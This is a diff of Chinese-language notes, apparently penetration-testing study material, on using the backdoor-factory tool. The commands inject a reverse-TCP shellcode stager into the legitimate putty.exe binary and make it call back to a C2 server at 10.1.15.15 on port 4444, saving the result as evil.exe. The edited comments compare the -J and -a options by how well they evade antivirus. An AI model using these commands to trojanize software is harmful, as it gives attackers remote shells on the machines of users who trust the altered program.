@@ -41,13 +41,16 @@ backdoor-factory -f putty.exe -S
 # 2. 检测某文件 的代码缝隙(code cave)及大小   这里查看size>200的代码缝隙
 backdoor-factory -f putty.exe -c -l 200
 
-# 3. 检测某文件 支持插入 本工具自带的哪些payload
+# 3. 检测某文件 具体支持插入 哪些payload(本工具自带的)
 backdoor-factory -f putty.exe -s show
 
-# 4. 插入指定payload代码
+
+# 4. 插入指定payload(本工具自带的)
 #    插入 本工具自带的某种具体的payload(这里是iat_reverse_tcp_stager_threaded)  -H指定C2服务器IP -P指定C2服务器端口
-#    如果 使用-J参数:将shellcode保存到>1个代码缝隙 - 以实现更好的免杀效果
-#    如果 不加-J参数:将shellcode保存到=1个代码缝隙 - 回车后 提示选择哪个可用的代码缝隙(code cave) 理论上选哪个都可以
+#    以下方式可选
+#    (1)如果 使用-J参数:将shellcode保存到>1个代码缝隙 - 如果shellcode过大可以用这个方式 且具有更好的免杀效果
+#    (2)如果 不加-J参数:将shellcode保存到=1个代码缝隙 - 选择某1个可用的代码缝隙(code cave) 理论上选哪个都可以
+#    (3)如果 使用-a参数:将新section添加到exe中 - 更容易成功 但免杀效果差
 backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.1.15.15 -P 4444 -o evil.exe -J
 ```
 
